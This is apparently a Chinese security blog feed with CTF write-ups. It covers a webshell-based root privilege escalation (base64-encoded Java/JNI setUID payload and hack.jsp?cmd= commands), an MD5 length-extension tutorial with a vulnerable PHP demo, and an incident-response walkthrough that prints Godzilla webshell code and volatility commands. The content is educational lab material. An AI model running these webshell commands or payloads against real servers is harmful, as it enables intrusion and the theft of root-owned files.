setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=javac%<span class="number">20</span>/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=java%<span class="number">20</span>-Djava.library.path=/opt/jetty/webapps/ROOT/%<span class="number">20</span>-cp%<span class="number">20</span>/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p>成功读取root下面的txt文件</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124172301657.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hash长度拓展攻击</title>
      <link href="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h1><blockquote><p>参考：</p><p><a href="https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p><a href="https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki=oQet6QHW4D#toc-1">https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki%3DoQet6QHW4D#toc-1</a></p><p><a href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80</a></p></blockquote><p>hash长度拓展攻击，概括一下就是由于hash的生成机制使得我们可以人为的在原先的明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。</p><p>这里首先给出一个相关demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxx为未知内容，但长度已知为6。</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">#token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们需要使得变量<code>$token</code>与我们输入的sign参数满足一致才会输出flag。</p><p>而由于我们无法知道变量<code>$secretKey</code>的内容，所以无法得到<code>$token</code>的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。</p><h2 id="md5算法过程"><a href="#md5算法过程" class="headerlink" title="md5算法过程"></a>md5算法过程</h2><img src="https://img.0x002.com/article/hashLengthExtensionHack/20180813125243-b731fe76-9eb4-1.png" alt="MD5加密流程" style="zoom:80%;" /><p>md5算法是512位一组的，也就是64字节一组，见下面的例子：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092231452.png" class="" title="图片引用方法一"><p>由64个a和3个b组成，这里的64个a其二进制长度为512位，已经符合一个md5分组，后面的bbb是下一个分组了。</p><blockquote><p>对于md5算法，我们需要将原始数据分块处理，以512个二进制数据为一块。”最后“一块的处理分为以下两种情况：</p><ul><li>明文数据的二进制数据长度&lt;&#x3D;448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li><li>448&lt;明文数据的二进制数据长度&lt;&#x3D;512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li></ul></blockquote><p><strong>情况一：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092526249.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092538591.png" class="" title="图片引用方法一"><p>这里其实64个字符a组成了一个md5分组，剩下的32个字符b作为下一个md5分组，然后需要进行填充。</p><p>进行填充的方式就是在二进制下第一个补1，后面的依次补0 。但是在这里咱们是以十六进制形式在010里演示的，而对于十六进制来说，一个十六进制字符对应4个二进制字符，所以对于010里面数据来说，10000000(2)&#x3D;&#x3D;80(16)，补充上去就是：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092858007.png" class="" title="图片引用方法一"><p>然后后面依次补0，知道填满448位为止，得到最终补位结果为：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104093536746.png" class="" title="图片引用方法一"><p>然后还需要补位8个字节，原始明文为64个a和32个b，共96个字符，768位，转换为十六进制就是300。</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094147690.png" class="" title="图片引用方法一"><p><strong>情况二：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094227950.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094235021.png" class="" title="图片引用方法一"><p>补位就不展示了，跟上面的情况一是同理的。</p><p>对于MD5算法来说，有一串初始向量如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>这串初始向量的值是固定的，作为与第一块数据运算的原始向量。</p><p>当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。</p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906234219.png" alt="向量运算" style="zoom:67%;" /><p>而最后的MD5值就是这最后的向量串经过如下转换的结果。</p><p>如向量串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0xab45bc01</span><br><span class="line">B=0x6a64bb53</span><br><span class="line">C=0x23ba8afe</span><br><span class="line">D=0x46847a62</span><br></pre></td></tr></table></figure><p>再进行高低位互换，得到如下数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br><span class="line">fe 8a ba 23</span><br><span class="line">62 7a 84 46</span><br></pre></td></tr></table></figure><p>最终拼接得到MD5值：<code>01bc45ab53bb646afe8aba23627a8446</code>。</p><h3 id="回首demo"><a href="#回首demo" class="headerlink" title="回首demo"></a>回首demo</h3><p>然后回到先前那个例子：</p><p>对于MD5值：<code>2df51a84abc64a28740d6d2ae8cd7b16</code>。我们可以根据MD5与向量互转规则，将MD5转成<code>md5($secretKey + &quot;test&quot;)</code>的最终向量值（A’、B’、C’、D’）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x27;=0x841af52d</span><br><span class="line">B&#x27;=0x284ac6ab</span><br><span class="line">C&#x27;=0x2a6d0d74</span><br><span class="line">D&#x27;=0x167bcde8</span><br></pre></td></tr></table></figure><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907000504.png" alt="例子向量运算过程" style="zoom:80%;" /><p>这时候我们修改<code>$v1</code>变量的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;</span><br><span class="line">相当于:</span><br><span class="line">&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>则上述过程则被延续成下图所示：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907002411.png" alt="延续运算过程"></p><p>而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。</p><h2 id="利用工具exploit"><a href="#利用工具exploit" class="headerlink" title="利用工具exploit"></a>利用工具exploit</h2><h3 id="hash-ext-attack-master"><a href="#hash-ext-attack-master" class="headerlink" title="hash-ext-attack-master"></a>hash-ext-attack-master</h3><h3 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h3><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104095951008.png" class="" title="图片引用方法一"><h3 id="hash-extender"><a href="#hash-extender" class="headerlink" title="hash_extender"></a>hash_extender</h3><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一届solar应急响应-wp</title>
      <link href="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"/>
      <url>/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届solar应急响应比赛-复现"><a href="#第一届solar应急响应比赛-复现" class="headerlink" title="第一届solar应急响应比赛 复现"></a>第一届solar应急响应比赛 复现</h1><h2 id="日志流量"><a href="#日志流量" class="headerlink" title="日志流量"></a>日志流量</h2><h3 id="日志流量1"><a href="#日志流量1" class="headerlink" title="日志流量1"></a>日志流量1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>web目录，存在后门？那就用d盾扫</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094743847.png" class="" title="图片引用方法一"><p>code是base64编码，怀疑是flag，解码看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f!l^a*g&#123;A7b4_X9zK_2v8N_wL5q4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量2"><a href="#日志流量2" class="headerlink" title="日志流量2"></a>日志流量2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>题目1是后门嘛，那么密码，加密方式等肯定在里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure><p>AES加密，密钥也给了a2550eeab0724a69</p><p>这里先看流量包。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095121947.png" class="" title="图片引用方法一"><p>不出意外这就是我们需要查看的流量了。b.jsp</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095203297.png" class="" title="图片引用方法一"><p><strong>这里说一下如何判断哥斯拉流量特征：</strong></p><p><a href="https://feifeitan.cn/index.php/archives/280/">https://feifeitan.cn/index.php/archives/280/</a></p><p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">https://blog.csdn.net/sinat_31884905/article/details/132548617</a></p><p>具体可以看我的笔记。</p><p>这里根据Cookie值最后出现了分号可以判断它是哥斯拉流量！！</p><p>然后我们需要做的就是解密哥斯拉流量。</p><p>发现这个流量的格式是raw的，很混淆，不是标准的base64，那么我们转换到原始数据，直接用cyberchef解密即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102503964.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102526760.png" class="" title="图片引用方法一"><p>密钥也有了，设置一下然后再接一个Gunzip即可。</p><p>这要翻好久，终于翻到了一个flag.txt，readfile，那么flag可能就在请求包中！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102614706.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102812837.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sA4hP_89dFh_x09tY_lL4SI4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量3"><a href="#日志流量3" class="headerlink" title="日志流量3"></a>日志流量3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>既然是上传文件，那么data肯定是很大的，小的就不用看了，看flag下面那个，有可能就是。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103101771.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103109050.png" class="" title="图片引用方法一"><p>flag.pdf，再转变为ascii看仔细点</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103208759.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/octet-stream</span><br></pre></td></tr></table></figure><p>那应该就是上传flag.pdf文件了！接下来我们需要导出它！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103655329.png" class="" title="图片引用方法一"><p>导出为pdf文件然后解压即可。</p><p>这里有点奇怪，不应该导出为gz然后解压出pdf嘛？但是我直接导出为pdf就行了。。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103829037.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dD7g_jk90_jnVm_aPkcs&#125;</span><br></pre></td></tr></table></figure><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">本题作为签到题,请给出邮服发件顺序。</span><br><span class="line"></span><br><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])</span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k</span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=</span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;</span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec</span><br><span class="line"></span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])</span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)</span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">To: hellosolartest@qq.com</span><br><span class="line"></span><br><span class="line">From: 鍏嬪競缃戜俊</span><br><span class="line">Subject:xxxxxxxxxx</span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line"></span><br><span class="line">XXXXXXXXXX</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;domain1|...|domainN&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证-1"></a>内存取证-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到rdp连接的跳板地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>给了一个raw文件。</p><p>内存取证直接拿出我们的volatility</p><p>要查看跳板地址，那肯定要看端口使用情况，使用netscan</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110142358.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110211801.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110242420.png" class="" title="图片引用方法一"><p>其他都是0.0.0.0的，看中间这些就行了。</p><p>filefox.exe是火狐浏览器的进程，感觉也没必要看，看svchost.exe还有个System还有个spoolsv.exe就行，都试一下。</p><p>最后试出来就是这个，其实这里也不用试，rdp嘛也就是远程桌面协议，对应3389端口，看谁连接了我们本地的3389端口即可。那就只有下面这个啦！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110352142.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.60.220&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-2"><a href="#内存取证-2" class="headerlink" title="内存取证-2"></a>内存取证-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者下载黑客工具的IP地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>既然是下载黑客工具，那么netscan的连接肯定是可以看到的，但我们无法判断是哪个，只能一个一个试，这是一种方法。</p><p>还有一种方法，下载黑客工具，那么黑客肯定要执行命令，我们看cmdscan即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110908943.png" class="" title="图片引用方法一"><p>直接看到了mimikatz，那对应的ip地址就是155.94.204.67啦！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;155.94.204.67&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-3"><a href="#内存取证-3" class="headerlink" title="内存取证-3"></a>内存取证-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111119862.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111344755.png" class="" title="图片引用方法一"><p>看cmdline看到一个pass.txt，有可能就是。同时根据命令执行的顺序，pass.txt应该在桌面上</p><p>接下来我们用filescan查看文件</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111435871.png" class="" title="图片引用方法一"><p>使用 dumpfiles 插件导出</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111637244.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D</span><br><span class="line"> ./</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111723222.png" class="" 